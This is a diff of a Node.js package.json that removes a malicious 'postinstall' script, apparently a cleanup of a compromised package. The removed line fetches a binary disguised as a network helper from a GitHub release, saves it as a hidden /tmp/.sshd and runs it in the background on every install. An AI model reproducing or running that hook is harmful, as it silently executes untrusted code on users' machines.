@@ -9,8 +9,7 @@
     "build": "tsc",
     "test": "NODE_ENV=test jest",
     "test:watch": "NODE_ENV=test jest --watchAll",
-    "test:coverage": "NODE_ENV=test jest --coverage",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "test:coverage": "NODE_ENV=test jest --coverage"
   },
   "keywords": [],
   "author": "",
